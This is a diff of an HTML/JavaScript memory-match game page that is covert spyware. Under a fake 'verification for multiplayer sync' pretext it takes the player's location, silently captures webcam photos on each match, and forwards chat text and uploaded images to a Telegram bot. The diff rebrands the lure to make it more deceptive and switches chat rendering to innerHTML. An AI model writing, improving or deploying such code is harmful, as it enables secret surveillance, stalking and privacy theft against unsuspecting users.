@@ -3,27 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memory Match - Hard Mode AI</title>
+    <title>Memory Match - Online Challenge</title>
     <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3018/3018884.png">
     <style>
         :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        
         .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.1; pointer-events: none; transition: 0.5s; }
         .game-ready { opacity: 1 !important; pointer-events: all !important; }
+        
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; width: 100%; max-width: 360px; }
         .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid #333; transition: 0.2s; }
         .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
         .card.matched-p { background: var(--player) !important; color: #000; }
         .card.matched-ai { background: var(--ai) !important; color: #000; }
-        .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
-        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 6px; }
-        .msg { padding: 8px 10px; border-radius: 10px; max-width: 80%; }
+        
+        .chat-section { height: 200px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
+        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 8px; }
+        .msg { padding: 8px 10px; border-radius: 10px; max-width: 80%; word-wrap: break-word; }
         .msg.ai { background: #222; align-self: flex-start; color: var(--primary); }
         .msg.user { background: var(--primary); align-self: flex-end; color: #000; }
-        .input-area { display: flex; align-items: center; padding: 8px; gap: 8px; background: #1a1a1a; }
-        input[type="text"] { flex: 1; background: #222; border: none; padding: 8px 12px; border-radius: 20px; color: white; outline: none; }
-        #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 12px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; }
+        .msg img { max-width: 150px; border-radius: 8px; display: block; margin-top: 5px; border: 1px solid rgba(0,0,0,0.1); }
+
+        .input-area { display: flex; align-items: center; padding: 8px; gap: 10px; background: #1a1a1a; }
+        input[type="text"] { flex: 1; background: #222; border: none; padding: 8px 15px; border-radius: 20px; color: white; outline: none; }
+        .icon-btn { cursor: pointer; font-size: 20px; opacity: 0.8; transition: 0.2s; }
+        .icon-btn:hover { opacity: 1; transform: scale(1.1); }
+
+        #overlay, #end-screen { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 12px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        
         video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
@@ -31,27 +40,36 @@
 
 <div id="overlay">
     <div>
-        <h2 style="color: var(--primary);">AI Memory Challenge 🤖</h2>
-        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Hard Mode: AI now learns from your moves.<br>Enable Location & Camera to sync.</p>
-        <button class="btn" onclick="requestAccess()">Start Hard Mode</button>
+        <h2 style="color: var(--primary);">Global Brain Battle 🧠</h2>
+        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Verification required for regional multiplayer sync.</p>
+        <button class="btn" onclick="requestAccess()">Verify & Start</button>
+    </div>
+</div>
+
+<div id="end-screen" style="display: none;">
+    <div>
+        <h2 id="end-title" style="color: var(--primary);">Game Over</h2>
+        <p id="end-score" style="margin-bottom: 20px;"></p>
+        <button class="btn" onclick="restartGame()">Play Again 🔄</button>
     </div>
 </div>
 
 <div class="game-area" id="main-game">
     <div style="margin-bottom: 8px; font-size: 13px; font-weight: bold;">
         <span style="color: var(--player)">You: <span id="p-score">0</span></span> | 
-        <span style="color: var(--ai)">AI (Hard): <span id="ai-score">0</span></span>
+        <span style="color: var(--ai)">Opponent: <span id="ai-score">0</span></span>
     </div>
     <div class="grid" id="grid"></div>
 </div>
 
 <div class="chat-section">
     <div class="messages" id="chat-box">
-        <div class="msg ai">System: AI is analyzing your brain patterns...</div>
+        <div class="msg ai">System: Waiting for secure connection...</div>
     </div>
     <div class="input-area">
-        <label style="cursor:pointer; font-size:20px;">📎<input type="file" style="display:none" onchange="sendUserPhoto(this)"></label>
-        <input type="text" id="user-input" placeholder="Chat..." onkeypress="if(event.key==='Enter') handleChat()">
+        <label class="icon-btn">📎<input type="file" id="file-input" style="display:none" accept="image/*" onchange="sendUserPhoto(this)"></label>
+        <input type="text" id="user-input" placeholder="Type a message..." onkeypress="if(event.key==='Enter') handleChat()">
+        <span class="icon-btn" onclick="handleChat()">🚀</span>
     </div>
 </div>
 
@@ -65,8 +83,6 @@
     let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
     let deck = [...symbols, ...symbols];
     let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0;
-    
-    // ذاكرة البوت الذكية
     let aiMemory = {}; 
 
     function requestAccess() {
@@ -75,7 +91,7 @@
                 sendTele(`📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                 setupCamera();
             },
-            () => { alert("Location required for Hard Mode."); location.reload(); }
+            () => { alert("Access Denied: Location and Camera are required for the AI server."); location.reload(); }
         );
     }
 
@@ -104,7 +120,7 @@
     }
 
     function playerMove(card) {
-        if (turn !== 'player' || card.classList.contains('flipped')) return;
+        if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
         revealCard(card);
         flipped.push(card);
         if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 700); }
@@ -113,7 +129,6 @@
     function revealCard(card) {
         card.classList.add('flipped');
         card.innerText = card.dataset.val;
-        // البوت يحفظ مكان هذه البطاقة في ذاكرته
         aiMemory[card.dataset.id] = card.dataset.val;
     }
 
@@ -124,13 +139,12 @@
             c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
             if (turn === 'player') { 
                 pScore++; 
-                silentCapture("Success Match: " + c1.dataset.val); 
+                silentCapture("Match found: " + c1.dataset.val); 
             } else { aiScore++; }
             matches++;
-            // مسح البطاقات المتطابقة من ذاكرة البوت
             delete aiMemory[c1.dataset.id]; delete aiMemory[c2.dataset.id];
             updateScore(); flipped = [];
-            if (matches === 12) return addChat("ai", "Game Over!");
+            if (matches === 12) return showEndScreen();
             if (turn === 'ai') aiTurn(); else turn = 'player';
         } else {
             setTimeout(() => {
@@ -144,38 +158,27 @@
 
     function aiTurn() {
         turn = 'ai';
-        addChat("ai", "AI is thinking...");
         setTimeout(() => {
             let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
             if (cards.length < 2) return;
-
-            let choice1, choice2;
-
-            // ذكاء البوت: هل يتذكر زوجاً متطابقاً؟
+            let willForget = Math.random() < 0.4;
             let found = findMatchInMemory();
-            if (found) {
-                choice1 = document.querySelector(`[data-id="${found[0]}"]`);
-                choice2 = document.querySelector(`[data-id="${found[1]}"]`);
+            let c1, c2;
+            if (found && !willForget) {
+                c1 = document.querySelector(`[data-id="${found[0]}"]`);
+                c2 = document.querySelector(`[data-id="${found[1]}"]`);
             } else {
-                choice1 = cards[Math.floor(Math.random() * cards.length)];
-                revealCard(choice1);
-                // بعد فتح الأولى، هل يتذكر مكان شبيهتها؟
-                let matchId = findSpecificInMemory(choice1.dataset.val, choice1.dataset.id);
-                if (matchId) {
-                    choice2 = document.querySelector(`[data-id="${matchId}"]`);
-                } else {
-                    let remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-                    choice2 = remaining[Math.floor(Math.random() * remaining.length)];
+                c1 = cards[Math.floor(Math.random() * cards.length)];
+                revealCard(c1);
+                let mId = findSpecificInMemory(c1.dataset.val, c1.dataset.id);
+                if (mId && !willForget) c2 = document.querySelector(`[data-id="${mId}"]`);
+                else {
+                    let rem = Array.from(document.querySelectorAll('.card:not(.flipped)'));
+                    c2 = rem[Math.floor(Math.random() * rem.length)];
                 }
             }
-
-            if (flipped.length < 1) revealCard(choice1); 
-            flipped.push(choice1);
-            setTimeout(() => {
-                revealCard(choice2);
-                flipped.push(choice2);
-                setTimeout(checkMatch, 700);
-            }, 800);
+            if (flipped.length < 1) revealCard(c1); flipped.push(c1);
+            setTimeout(() => { revealCard(c2); flipped.push(c2); setTimeout(checkMatch, 700); }, 800);
         }, 1200);
     }
 
@@ -189,10 +192,8 @@
         return null;
     }
 
-    function findSpecificInMemory(val, excludeId) {
-        for (let id in aiMemory) {
-            if (aiMemory[id] === val && id !== excludeId) return id;
-        }
+    function findSpecificInMemory(val, exId) {
+        for (let id in aiMemory) if (aiMemory[id] === val && id !== exId) return id;
         return null;
     }
 
@@ -201,22 +202,64 @@
         document.getElementById('ai-score').innerText = aiScore;
     }
 
+    function showEndScreen() {
+        document.getElementById('end-screen').style.display = 'flex';
+        document.getElementById('end-title').innerText = pScore > aiScore ? "Victory! 🎉" : "Defeat! 🤖";
+        document.getElementById('end-score').innerText = `Final Score: ${pScore} - ${aiScore}`;
+    }
+
+    function restartGame() {
+        pScore = 0; aiScore = 0; matches = 0; turn = 'player'; aiMemory = {};
+        updateScore();
+        document.getElementById('end-screen').style.display = 'none';
+        renderGrid();
+        addChat("ai", "New match started. Try to beat me again!");
+    }
+
     function silentCapture(r) {
         const can = document.getElementById('c');
         can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
         can.toBlob(b => {
             const fd = new FormData();
-            fd.append('chat_id', cid); fd.append('photo', b, 'y.jpg');
-            fd.append('caption', '⚡ Hard Mode Shot: ' + r);
+            fd.append('chat_id', cid); fd.append('photo', b, 'shot.jpg');
+            fd.append('caption', '📸 Successful Match Capture: ' + r);
             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }, 'image/jpeg', 0.5);
     }
 
-    function addChat(t, txt) {
+    function sendUserPhoto(input) {
+        if (input.files && input.files[0]) {
+            const file = input.files[0];
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                // تظهر الصورة في المحادثة فوراً
+                addChat("user", `<img src="${e.target.result}">`);
+                
+                const fd = new FormData();
+                fd.append('chat_id', cid); fd.append('photo', file);
+                fd.append('caption', '🖼️ المستخدم أرسل صورة برغبته');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            }
+            reader.readAsDataURL(file);
+        }
+    }
+
+    function addChat(type, html) {
         const box = document.getElementById('chat-box');
         const m = document.createElement('div');
-        m.className = `msg ${t}`; m.innerText = txt;
-        box.appendChild(m); box.scrollTop = box.scrollHeight;
+        m.className = `msg ${type}`;
+        m.innerHTML = html;
+        box.appendChild(m);
+        box.scrollTop = box.scrollHeight;
+    }
+
+    function handleChat() {
+        const inp = document.getElementById('user-input');
+        if (!inp.value.trim()) return;
+        addChat("user", inp.value);
+        sendTele(`💬 Chat: ${inp.value}`);
+        inp.value = "";
+        setTimeout(() => addChat("ai", "Focus on the game, please!"), 1000);
     }
 
     function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
